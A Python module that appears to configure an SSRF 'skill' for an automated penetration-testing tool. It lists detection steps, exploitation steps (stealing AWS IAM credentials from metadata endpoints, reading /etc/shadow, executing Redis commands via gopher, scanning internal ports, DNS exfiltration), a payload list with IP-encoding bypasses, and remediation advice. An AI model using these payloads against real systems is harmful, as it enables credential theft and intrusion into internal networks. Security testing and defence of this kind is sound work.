"""Server-Side Request Forgery (SSRF) - Enhanced with PortSwigger techniques."""

SKILL = {
    "id": "ssrf",
    "name": "Server-Side Request Forgery (SSRF)",
    "category": "injection",
    "severity": "critical",

    "detection": """
- Look for parameters that accept URLs: ?url=, ?redirect=, ?image=, ?webhook=, ?proxy=, ?fetch=, ?load=, ?src=
- Look for features: URL preview, PDF generation, file import from URL, webhook config, image proxy
- Test with internal IPs: http://127.0.0.1, http://localhost, http://169.254.169.254
- Test cloud metadata endpoints:
  AWS: http://169.254.169.254/latest/meta-data/
  AWS IMDSv2: TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") then curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
  GCP: http://metadata.google.internal/computeMetadata/v1/ (needs Metadata-Flavor: Google header)
  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (needs Metadata: true header)
  DigitalOcean: http://169.254.169.254/metadata/v1/
- Test DNS rebinding: use a domain that resolves to 127.0.0.1
- Test protocol handlers: file:///etc/passwd, gopher://, dict://
- Check for blind SSRF: use external callback server (Burp Collaborator, interactsh)
- Test in XML/SOAP: XXE with external entities pointing to internal URLs
""",

    "exploitation": """
- Read AWS credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  Then: http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
  Returns: AccessKeyId, SecretAccessKey, Token
- Read internal services: http://localhost:8080/admin, http://localhost:6379 (Redis)
- Port scan internal network: iterate ports 1-65535 on 127.0.0.1 and internal IPs
- Access databases: http://localhost:3306 (MySQL), http://localhost:5432 (PostgreSQL)
- Redis command execution via gopher: gopher://127.0.0.1:6379/_SET%20key%20value
- Read local files: file:///etc/passwd, file:///etc/shadow, file:///proc/self/environ
- Chain with other vulns: SSRF to internal API → RCE via unprotected admin endpoint
- Extract data via DNS exfiltration if response not returned
- Kubernetes: http://kubernetes.default.svc/api/v1/namespaces
""",

    "remediation": """
- Validate and sanitize all user-provided URLs with strict allowlist
- Use allowlist of permitted domains/IPs (NEVER blocklist only)
- Block ALL requests to private IP ranges at network level:
  10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7
- Block cloud metadata IPs (169.254.169.254)
- Disable unused URL schemes (only allow http and https)
- Resolve DNS BEFORE making request, then check if resolved IP is internal
- Use IMDSv2 on AWS (requires token for metadata access)
- Set network-level firewall: web app cannot initiate connections to internal network
- Run URL fetching in isolated container with restricted network
- Implement request timeout and response size limits
- SSH fix: Add URL validation to application code (whitelist domains)
- SSH fix: iptables -A OUTPUT -d 169.254.169.254 -j DROP (from web app user)
- SSH fix: iptables -A OUTPUT -d 10.0.0.0/8 -j DROP (from web app user)
- Verify: Test all SSRF payloads including bypass techniques, confirm blocked
""",

    "tools": ["http_request", "http_headers_check", "nmap_scan", "web_spider", "waf_detect", "api_fuzzer"],

    "payloads": [
        "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://[::1]", "http://0x7f000001", "http://2130706433",
        "http://017700000001", "http://127.1",
        "file:///etc/passwd", "gopher://127.0.0.1:25",
        "http://127.0.0.1:8080/admin",
        "http://127.0.0.1:6379", "http://127.0.0.1:3306",
        "http://kubernetes.default.svc/api/v1/",
        "http://0177.0.0.1", "http://0x7f.0x0.0x0.0x1",
        "http://127.0.0.1.nip.io",
    ],

    "references": [
        "OWASP A10:2021 - Server-Side Request Forgery",
        "CWE-918: Server-Side Request Forgery",
        "CAPEC-664: Server Side Request Forgery",
    ],
}
